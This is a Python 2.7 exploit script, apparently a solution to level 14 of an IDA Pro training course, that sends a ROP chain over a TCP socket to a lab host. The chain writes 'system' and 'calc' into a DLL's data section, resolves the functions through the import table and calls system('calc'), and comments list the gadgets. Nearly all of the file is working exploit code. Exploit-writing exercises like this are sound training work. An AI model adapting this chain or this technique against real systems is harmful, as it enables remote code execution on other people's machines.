# Python 2.7 x86
# Solution for auto evaluation: Level 14
# Curso IDA Pro de Ricardo Narvaja.
# by @rextco
import string
import random
import struct
import socket


def read_file(file_name):
    with open(file_name, "rb") as f:
        content = f.read()
    return bytearray(content)


def write_file(file_name, content):
    with open(file_name, "wb") as f:
        f.write(content)


def random_word(length):
    letters = string.ascii_uppercase
    return "".join(random.choice(letters) for char in range(length))


def exploit_remote(host, port, file_cache=False):
    print("Exploit!Socket!Call")
    print("DebugMode!FileCache = {}".format(file_cache))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print("[*] Starting connection to host: %s and port: %s" % (host, port))
        s.connect((host, port))
        print("recv = {:s}".format(s.recv(0x30)))

        if file_cache:
            stuff = read_file("debug_bad_food.txt")
        else:
            stuff = ""
            stuff += "\x90" * 0x100
            # Write "system" on .data section
            stuff += struct.pack("<L", 0x6044AD56)      # pop esi; retn
            stuff += struct.pack("<L", 0x60451AA0 - 4)  # .data address W on .dll
            stuff += struct.pack("<L", 0x60438AB3)      # mov eax, esi; pop esi; retn
            stuff += struct.pack("<L", 0x90909090)      # padding
            stuff += struct.pack("<L", 0x6044958A)      # pop ecx; retn
            stuff += struct.pack("<L", 0x74737973)      # string=syst
            stuff += struct.pack("<L", 0x60438AF7)      # mov [eax+4], ecx; retn
            stuff += struct.pack("<L", 0x6044AD56)      # pop esi; retn
            stuff += struct.pack("<L", 0x60451AA0)      # .data address W on .dll
            stuff += struct.pack("<L", 0x60438AB3)      # mov eax, esi; pop esi; retn
            stuff += struct.pack("<L", 0x90909090)      # padding
            stuff += struct.pack("<L", 0x6044958A)      # pop ecx; retn
            stuff += struct.pack("<L", 0x6d65)          # string=em
            stuff += struct.pack("<L", 0x60438AF7)      # mov [eax+4], ecx; retn

            # Write "calc" on .data section
            stuff += struct.pack("<L", 0x6044AD56)      # pop esi; retn
            stuff += struct.pack("<L", 0x60451AB0 - 4)  # .data address W on .dll
            stuff += struct.pack("<L", 0x60438AB3)      # mov eax, esi; pop esi; retn
            stuff += struct.pack("<L", 0x90909090)      # padding
            stuff += struct.pack("<L", 0x6044958A)      # pop ecx; retn
            stuff += struct.pack("<L", 0x636c6163)      # string=calc
            stuff += struct.pack("<L", 0x60438AF7)      # mov [eax+4], ecx; retn

            # Call GetModuleHandleA
            stuff += struct.pack("<L", 0x6044958A)      # pop ecx; retn
            stuff += struct.pack("<L", 0x6044C07C)      # IAT GetModuleHandleA
            stuff += struct.pack("<L", 0x60436A0F)      # call dword ptr [ecx]; pop ebp; retn 8
            stuff += struct.pack("<L", 0x60450176)      # arg_0 = ptr_string (MSVCRT.dll)
            stuff += struct.pack("<L", 0x90909090)      # padding
            stuff += struct.pack("<L", 0x6044958A)      # (next gadget) pop ecx; retn
            stuff += struct.pack("<L", 0x90909090)      # padding
            stuff += struct.pack("<L", 0x90909090)      # padding

            # Call GetProcAddress
            # stuff += struct.pack("<L", 0x6044958A)    # pop ecx; retn
            stuff += struct.pack("<L", 0x6044C074 - 8)  # IAT GetProcAddress
            stuff += struct.pack("<L", 0x60432F08)      # push eax; call dword ptr [ecx+8]; retn
                                                        # arg_0 = Base module of msvcrt.dll
            stuff += struct.pack("<L", 0x60451AA0)      # arg_1 = ptr_string (system)

            # Call system
            stuff += struct.pack("<L", 0x6044933D)      # push eax; retn
            stuff += struct.pack("<L", 0x90909090)      # next gadget (clean exit?)
            stuff += struct.pack("<L", 0x60451AB0)      # arg_0 = ptr_string (calc)
            write_file("debug_bad_food.txt", stuff)

        print("length = {:d}".format(len(stuff)))
        s.send(stuff + "\n")

    except Exception as e:
        s.close()
        raise e

    s.close()


if __name__ == "__main__":
    exploit_remote(host="192.168.1.20", port=8888, file_cache=False)
    # exploit_remote(host="192.168.1.21", port=8888, file_cache=False)


# Work under: Windows 7
# Gadgets

# 0x6044AD56 pop esi; retn
# 0x60438AB3 mov eax, esi; pop esi; retn

# 0x6044958A pop ecx; retn
# 0x60438AF7 mov [eax+4], ecx; retn

# 0x6044933D push eax; retn
# 0x60432F08 push eax; call dword ptr [ecx+8]; retn
# 0x60436A0F call dword ptr [ecx]; pop ebp; retn 8 (Too bad)
# 0x60431C81 push ecx; call eax
